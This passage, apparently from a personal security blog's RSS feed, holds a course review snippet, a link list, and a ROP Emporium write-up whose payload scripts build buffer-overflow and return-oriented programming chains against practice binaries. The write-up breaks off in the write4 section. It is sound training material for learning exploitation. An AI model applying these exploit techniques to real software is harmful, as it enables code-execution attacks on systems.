+<h1 id="conclusion">conclusion</h1>
+<p>The course was overall enjoyable. The ability to cheaply and legally gain some hands-on experience with Cobalt strike is enough of a reason to buy the course. The exam experience was fairly relaxed and fun. I recommend it to everyone who wishes to learn more about red teaming.</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>random links 1</title>
+            <link>http://localhost:1313/posts/links-1/</link>
+            <pubDate>Fri, 27 May 2022 00:00:00 +0000</pubDate>
+            
+            <guid>http://localhost:1313/posts/links-1/</guid>
+            <description>Collections of random cool links I&amp;rsquo;ve stumbled across.
+Kerberosity Killed the Domain: An Offensive Kerberos Overview: Kerebos authenication is hard to understand, but this article is easy to read. It features very pretty pictures and is easy to understand. It is a good read for anyone looking to understand kerberos related offensive security techniques.
+How Developers Stop Learning: Rise of the Expert Beginner: A blog post that explains how some people can lose the will to keep learning.</description>
+            <content type="html"><![CDATA[<p>Collections of random cool links I&rsquo;ve stumbled across.</p>
+<p><a href="https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61"><strong>Kerberosity Killed the Domain: An Offensive Kerberos Overview</strong></a>: Kerebos authenication is hard to understand, but this article is easy to read. It features very pretty pictures and is easy to understand. It is a good read for anyone looking to understand kerberos related offensive security techniques.</p>
+<p><a href="https://daedtech.com/how-developers-stop-learning-rise-of-the-expert-beginner/">How Developers Stop Learning: Rise of the Expert Beginner</a>: A blog post that explains how some people can lose the will to keep learning.</p>
+<p><a href="https://news.ycombinator.com/item?id=31438426">Tell HN: The loneliness of a pretty good developer</a>: I have seen people complain about feeling incompetant at their job. It is interesting to read about someone with the opposite problem.</p>
+<p><a href="https://jasont.co/ennui/">How to feel engaged at work: a software engineer&rsquo;s guide</a>: Not completely sure how most of the sugestions make one feel more engaged at work, but all the suggestion are fun.</p>
+<p><a href="https://about.sourcegraph.com/blog/developer-productivity-thoughts">A dev&rsquo;s thoughts on developer productivity</a>: I have not read this, but the graphs look very nice.</p>
+<p><a href="https://hamberg.no/gtd">GTD in 15 minutes – A Pragmatic Guide to Getting Things Done</a>: I have not read this, but the pictures look very nice.</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Rop writeups ret2win-write41</title>
+            <link>http://localhost:1313/posts/rop1/</link>
+            <pubDate>Wed, 25 May 2022 00:00:00 +0000</pubDate>
+            
+            <guid>http://localhost:1313/posts/rop1/</guid>
+            <description>While attempting to solve a CTF for a job interview, I learned the basics of crafting return-oriented programming exploits. This knowledge inspired me to create a write up for a few challenges that involve ROP from ROP Emporium.
+introduction to Rop Return-oriented programming can be thought of as an advanced form of buffer overflow. The basic buffer overflow involves gaining control of the instruction pointer and then pointing it to shellcode code added to the stack.</description>
+            <content type="html"><![CDATA[<p>While attempting to solve a CTF for a job interview, I learned the basics of crafting return-oriented programming exploits. This knowledge inspired me to create a write up for a few challenges that involve ROP from <a href="https://ropemporium.com/">ROP Emporium</a>.</p>
+<h1 id="introduction-to-rop">introduction to Rop</h1>
+<p>Return-oriented programming can be thought of as an advanced form of buffer overflow. The basic buffer overflow involves gaining control of the instruction pointer and then pointing it to shellcode code added to the stack. One protection against the basic buffer overflow is making the stack not executable. This protection means in the event a basic buffer overflow is attempted an exception is thrown once the instruction pointer is pointed to the shellcode on the stack.
+This protection does not fix the underlying problem. An attacker still has control over the instruction pointer. An attacker can still change the flow of execution of the program. An attacker cannot  execute on the stack, but an attacker can still point the instruction pointer to parts of the memory that has executable permissions.  The ROP exploit technique involves recycling code within the binary to cause unintended behavior. The technique is easier to understand once one looks at examples.</p>
+<h1 id="ret2win">ret2win</h1>
+<p>I begin with the first recommended challenge ret2win. I download the binary and begin by verifying the buffer overflow exists.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python -c <span style="color:#e6db74">&#34;print(&#39;a&#39;*100)&#34;</span> | ./ret2win32
+</span></span></code></pre></div><p>The program crashes as expected. It is now time to gain control over the instruction pointer. I used this <a href="https://wiremask.eu/tools/buffer-overflow-pattern-generator/">website</a> to generate a cyclical pattern to feed into the program. I open the program in gdb, a debugger, so that I may inspect the registers after crashing the program. I get this output.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> info registers
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>eip            0x35624134          0x35624134
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>I feed this value back into the website from earlier. I discover bytes after the 44th end up in eip. I can control of the instruction pointer. In a normal buffer overflow, this control is used to execute the shellcode placed on the stack. This action cannot be done in this situation. The stack is not executable. No code written on the stack can be executed, but we can still redirect execution elsewhere within the binary.</p>
+<p>I begin by using the <code>info functions</code> function within gdb to see which functions are available within the binary. I spot a fairly interesting function called <code>ret2win</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> info functions   
+</span></span><span style="display:flex;"><span>All defined functions:  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>Non-debugging symbols:
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>0x0804862c ret2win
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>I will redirect execution to the address associated with the ret2win function. I wrote a small python program to generate the desired payload.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x41</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">44</span> <span style="color:#75715e"># padding for the first 44 bytes</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0x0804862c</span>) <span style="color:#75715e"># address of ret2win</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>out<span style="color:#f92672">=</span> bytes(buf)
+</span></span><span style="display:flex;"><span>sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>buffer<span style="color:#f92672">.</span>write(out) 
+</span></span></code></pre></div><p>Running <code>python3 ret2win32.py | ./ret2win32</code> results in the flag being outputted.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 ret2win32.py | ./ret2win32  
+</span></span><span style="display:flex;"><span>ret2win by ROP Emporium  
+</span></span><span style="display:flex;"><span>x86  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>For my first trick, I will attempt to fit <span style="color:#ae81ff">56</span> bytes of user input into <span style="color:#ae81ff">32</span> bytes of stack buffer!  
+</span></span><span style="display:flex;"><span>What could possibly go wrong?  
+</span></span><span style="display:flex;"><span>You there, may I have your input please? And don<span style="color:#e6db74">&#39;t worry about null bytes, we&#39;</span>re using read<span style="color:#f92672">()</span>!  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>&gt; Thank you!  
+</span></span><span style="display:flex;"><span>Well <span style="color:#66d9ef">done</span>! Here<span style="color:#e6db74">&#39;s your flag:  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ROPE{a_placeholder_32byte_flag!}  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">fish: Process 16443, &#39;</span>./ret2win32<span style="color:#e6db74">&#39; from job 1, &#39;</span>python3 ret2win32.py | ./ret2wi…<span style="color:#960050;background-color:#1e0010">&#39;</span> terminated by signal SIGSEGV <span style="color:#f92672">(</span>Address boundary error<span style="color:#f92672">)</span>
+</span></span></code></pre></div><h2 id="split">split</h2>
+<p>The offset is the same as the last binary 44. The prompt for the challenge suggests there will be a need to form a short rop chain. I begin by looking at the functions available.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> info functions   
+</span></span><span style="display:flex;"><span>All defined functions:  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>Non-debugging symbols:
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>0x0804860c usefulFunction
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>I look at the disassembly of the <code>usefulFunction.</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> disassemble usefulFunction  
+</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> usefulFunction:  
+</span></span><span style="display:flex;"><span>  0x0804860c &lt;+0&gt;:     push   %ebp  
+</span></span><span style="display:flex;"><span>  0x0804860d &lt;+1&gt;:     mov    %esp,%ebp  
+</span></span><span style="display:flex;"><span>  0x0804860f &lt;+3&gt;:     sub    $0x8,%esp  
+</span></span><span style="display:flex;"><span>  0x08048612 &lt;+6&gt;:     sub    $0xc,%esp  
+</span></span><span style="display:flex;"><span>  0x08048615 &lt;+9&gt;:     push   $0x804870e  
+</span></span><span style="display:flex;"><span>  0x0804861a &lt;+14&gt;:    call 0x80483e0 &lt;system@plt&gt;  
+</span></span><span style="display:flex;"><span>  0x0804861f &lt;+19&gt;:    add    $0x10,%esp  
+</span></span><span style="display:flex;"><span>  0x08048622 &lt;+22&gt;:    nop  
+</span></span><span style="display:flex;"><span>  0x08048623 &lt;+23&gt;:    leave   
+</span></span><span style="display:flex;"><span>  0x08048624 &lt;+24&gt;:    ret   
+</span></span><span style="display:flex;"><span>End of assembler dump.
+</span></span></code></pre></div><p>There is a call to <code>system().</code> The system function allows the program to call <a href="https://www.geeksforgeeks.org/system-call-in-c/">operating systems commands</a>. The system function accepts a pointer to a string containing the command to be executed. This function call will be useful for reading the flag. I only need to find a location in memory to pass to the function as an argument to pass to the function. I used edb to find where in memory the string <code>/bin/cat flag.txt</code> existed.</p>
+
+    <img src="/img/rop1/edb.png"  alt="Under construction"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>I then had everything needed to create the ROP chain.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x41</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">44</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0x80483e0</span>) <span style="color:#75715e"># call to system</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x42</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span> <span style="color:#75715e"># fake return address</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0x804a030</span>) <span style="color:#75715e"># arg 1 / location of string</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>out<span style="color:#f92672">=</span> bytes(buf)
+</span></span><span style="display:flex;"><span>sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>buffer<span style="color:#f92672">.</span>write(out)
+</span></span></code></pre></div><p>Feeding this output into the vulnerable program results in the flag being outputted.</p>
+<h1 id="callme">callme</h1>
+<p>The offset is once again 44. For this binary, we will attempt to call multiple functions. The challenge explicitly states which function calls and which arguments are needed. I begin by finding the address of all the functions I wish to call. This is done with the <code>info functions</code> command used earlier in gdb. Care is taken to use the <code>@plt</code> version of the function.</p>
+<p>A trip to <a href="https://stackoverflow.com/questions/5469274/what-does-plt-mean-here">stack overflow</a> and a watch of a <a href="https://www.youtube.com/watch?v=kUk5pw4w0h4">LiveOverflow video</a>
+helped me understand what the @plt meant. Plt stands for procedure linkage table. The procedure linkage table is used when the compiler dynamically links an external library. The location of the function within the dynamically linked library that needs to be called cannot be known at compile time. As a result, the location of that function in the library is resolved when the binary is executed. The <code>@plt</code> version of the program is a stub that eventually leads to the calling of the actual desired function.</p>
+<p>Now I can think about how the stack should look when making multiple function calls. The ultimate goal is to make the stack look like so:</p>
+<pre tabindex="0"><code>----------------------
+|  etc   ...         |
+----------------------
+|  next function call|
+----------------------
+|  arg 3             |
+----------------------
+|  arg 2             |
+----------------------
+|  arg 1             |
+----------------------
+|  return address    |
+----------------------
+|  function call     |
+----------------------
+</code></pre><p>The return address, in this case, should be a rop gadget that pops three items off the stack. Removing the arguments from the stacks cleans up the stack so that the next function call can happen smoothly. There exist several programs that can find rop gadgets within binaries. I used <a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a> in this situation. The command <code>ROPgadget --binary callme32</code> can be used to see some possibly useful gadgets within the binary.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Gadgets information  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">============================================================</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>0x080487f9 : pop esi ; pop edi ; pop ebp ; ret
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x41</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">44</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0x080484f0</span>) <span style="color:#75715e"># callme_one@plt</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0x080487f9</span>) <span style="color:#75715e"># gadget with 3 pops</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># arg 1</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0xcafebabe</span>) <span style="color:#75715e"># arg 2</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0xd00df00d</span>) <span style="color:#75715e"># arg 3</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0x08048550</span>) <span style="color:#75715e"># callme_two@plt</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0x080487f9</span>)
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0xdeadbeef</span>)
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0xcafebabe</span>)
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0xd00df00d</span>)
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0x080484e0</span>) <span style="color:#75715e"># callme_three@plt</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0x080487f9</span>)
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0xdeadbeef</span>)
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0xcafebabe</span>)
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0xd00df00d</span>)
+</span></span><span style="display:flex;"><span>out<span style="color:#f92672">=</span> bytes(buf)
+</span></span><span style="display:flex;"><span>sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>buffer<span style="color:#f92672">.</span>write(out)
+</span></span></code></pre></div><p>Running the program outputs the flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>callme by ROP Emporium  
+</span></span><span style="display:flex;"><span>x86  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>Hope you read the instructions...  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>&gt; Thank you!  
+</span></span><span style="display:flex;"><span>callme_one<span style="color:#f92672">()</span> called correctly  
+</span></span><span style="display:flex;"><span>callme_two<span style="color:#f92672">()</span> called correctly  
+</span></span><span style="display:flex;"><span>ROPE<span style="color:#f92672">{</span>a_placeholder_32byte_flag!<span style="color:#f92672">}</span>
+</span></span></code></pre></div><h1 id="write4">write4</h1>
+<p>The offset is still 44.</p>
+<p>I begin by looking at the functions.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> info functions    
+</span></span><span style="display:flex;"><span>All defined functions:  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>Non-debugging symbols:  
+</span></span><span style="display:flex;"><span>0x0804837c  _init  
+</span></span><span style="display:flex;"><span>0x080483b0  pwnme@plt  
+</span></span><span style="display:flex;"><span>0x080483c0  __libc_start_main@plt  
+</span></span><span style="display:flex;"><span>0x080483d0  print_file@plt  
+</span></span><span style="display:flex;"><span>0x080483e0  __gmon_start__@plt  
+</span></span><span style="display:flex;"><span>0x080483f0  _start  
+</span></span><span style="display:flex;"><span>0x08048430  _dl_relocate_static_pie  
+</span></span><span style="display:flex;"><span>0x08048440  __x86.get_pc_thunk.bx  
+</span></span><span style="display:flex;"><span>0x08048450  deregister_tm_clones  
+</span></span><span style="display:flex;"><span>0x08048490  register_tm_clones  
+</span></span><span style="display:flex;"><span>0x080484d0  __do_global_dtors_aux  
+</span></span><span style="display:flex;"><span>0x08048500  frame_dummy  
+</span></span><span style="display:flex;"><span>0x08048506  main  
+</span></span><span style="display:flex;"><span>0x0804852a  usefulFunction  
+</span></span><span style="display:flex;"><span>0x08048543  usefulGadgets  
+</span></span><span style="display:flex;"><span>0x08048550  __libc_csu_init  
+</span></span><span style="display:flex;"><span>0x080485b0  __libc_csu_fini  
+</span></span><span style="display:flex;"><span>0x080485b4  _fini
+</span></span></code></pre></div><p>The usefulFunction and usefulGadgets functions look interesting, so I examine them more closely.</p>
+<p>The usefulFunction disassembly seems to contain the print_file function I need to call with the argument &ldquo;flag.txt&rdquo; according to the instructions in the challenge.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> disassemble usefulFunction      
+</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> usefulFunction:  
+</span></span><span style="display:flex;"><span>  0x0804852a &lt;+0&gt;:     push   ebp  
+</span></span><span style="display:flex;"><span>  0x0804852b &lt;+1&gt;:     mov    ebp,esp  
+</span></span><span style="display:flex;"><span>  0x0804852d &lt;+3&gt;:     sub    esp,0x8  
+</span></span><span style="display:flex;"><span>  0x08048530 &lt;+6&gt;:     sub    esp,0xc  
+</span></span><span style="display:flex;"><span>  0x08048533 &lt;+9&gt;:     push   0x80485d0  
+</span></span><span style="display:flex;"><span>  0x08048538 &lt;+14&gt;:    call   0x80483d0 &lt;print_file@plt&gt;  
+</span></span><span style="display:flex;"><span>  0x0804853d &lt;+19&gt;:    add    esp,0x10  
+</span></span><span style="display:flex;"><span>  0x08048540 &lt;+22&gt;:    nop  
+</span></span><span style="display:flex;"><span>  0x08048541 &lt;+23&gt;:    leave     
+</span></span><span style="display:flex;"><span>  0x08048542 &lt;+24&gt;:    ret       
+</span></span><span style="display:flex;"><span>End of assembler dump.
+</span></span></code></pre></div><p>The usefulGadgets function contains one apparently useful gadget. The gadget at <code>0x08048543</code> allows me to move the contents of ebp into the memory address pointed to by the register edi.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> disassemble usefulGadgets      
+</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> usefulGadgets:  
+</span></span><span style="display:flex;"><span>  0x08048543 &lt;+0&gt;:     mov    DWORD PTR <span style="color:#f92672">[</span>edi<span style="color:#f92672">]</span>,ebp  
+</span></span><span style="display:flex;"><span>  0x08048545 &lt;+2&gt;:     ret       
+</span></span><span style="display:flex;"><span>  0x08048546 &lt;+3&gt;:     xchg   ax,ax  
+</span></span><span style="display:flex;"><span>  0x08048548 &lt;+5&gt;:     xchg   ax,ax  
+</span></span><span style="display:flex;"><span>  0x0804854a &lt;+7&gt;:     xchg   ax,ax  
+</span></span><span style="display:flex;"><span>  0x0804854c &lt;+9&gt;:     xchg   ax,ax  
+</span></span><span style="display:flex;"><span>  0x0804854e &lt;+11&gt;:    xchg   ax,ax  
+</span></span><span style="display:flex;"><span>End of assembler dump.
+</span></span></code></pre></div><p>The first order of business is finding a place within the binary that can be overwritten without breaking anything. Readelf can be used to look at the sections of the binary.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; readelf -a write432
+</span></span><span style="display:flex;"><span>Section Headers:  
+</span></span><span style="display:flex;"><span> ...
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">000004</span> <span style="color:#ae81ff">04</span>  WA  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">4</span>  
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">[</span>20<span style="color:#f92672">]</span> .fini_array       FINI_ARRAY      08049f00 000f00 <span style="color:#ae81ff">000004</span> <span style="color:#ae81ff">04</span>  WA  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">4</span>  
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">[</span>21<span style="color:#f92672">]</span> .dynamic          DYNAMIC         08049f04 000f04 0000f8 <span style="color:#ae81ff">08</span>  WA  <span style="color:#ae81ff">6</span>   <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">4</span>  
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">[</span>22<span style="color:#f92672">]</span> .got              PROGBITS        08049ffc 000ffc <span style="color:#ae81ff">000004</span> <span style="color:#ae81ff">04</span>  WA  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">4</span>  
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">[</span>23<span style="color:#f92672">]</span> .got.plt          PROGBITS        0804a000 <span style="color:#ae81ff">001000</span> <span style="color:#ae81ff">000018</span> <span style="color:#ae81ff">04</span>  WA  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">4</span>  
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">[</span>24<span style="color:#f92672">]</span> .data             PROGBITS        0804a018 <span style="color:#ae81ff">001018</span> <span style="color:#ae81ff">000008</span> <span style="color:#ae81ff">00</span>  WA  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">4</span>  
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">[</span>25<span style="color:#f92672">]</span> .bss              NOBITS          0804a020 <span style="color:#ae81ff">001020</span> <span style="color:#ae81ff">000004</span> <span style="color:#ae81ff">00</span>  WA  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">1</span>  
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>Key to Flags:  
+</span></span><span style="display:flex;"><span> W <span style="color:#f92672">(</span>write<span style="color:#f92672">)</span>, A <span style="color:#f92672">(</span>alloc<span style="color:#f92672">)</span>, X <span style="color:#f92672">(</span>execute<span style="color:#f92672">)</span>, M <span style="color:#f92672">(</span>merge<span style="color:#f92672">)</span>, S <span style="color:#f92672">(</span>strings<span style="color:#f92672">)</span>, I <span style="color:#f92672">(</span>info<span style="color:#f92672">)</span>,  
+</span></span><span style="display:flex;"><span> L <span style="color:#f92672">(</span>link order<span style="color:#f92672">)</span>, O <span style="color:#f92672">(</span>extra OS processing required<span style="color:#f92672">)</span>, G <span style="color:#f92672">(</span>group<span style="color:#f92672">)</span>, T <span style="color:#f92672">(</span>TLS<span style="color:#f92672">)</span>,  
+</span></span><span style="display:flex;"><span> C <span style="color:#f92672">(</span>compressed<span style="color:#f92672">)</span>, x <span style="color:#f92672">(</span>unknown<span style="color:#f92672">)</span>, o <span style="color:#f92672">(</span>OS specific<span style="color:#f92672">)</span>, E <span style="color:#f92672">(</span>exclude<span style="color:#f92672">)</span>,  
+</span></span><span style="display:flex;"><span> D <span style="color:#f92672">(</span>mbind<span style="color:#f92672">)</span>, p <span style="color:#f92672">(</span>processor specific<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>The .data section appears to be writeable. Readelf can also be used to read that section.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt;readelf write432 -x .data
+</span></span><span style="display:flex;"><span>Hex dump of section <span style="color:#e6db74">&#39;.data&#39;</span>:  
+</span></span><span style="display:flex;"><span> 0x0804a018 <span style="color:#ae81ff">00000000</span> <span style="color:#ae81ff">00000000</span>                   ........
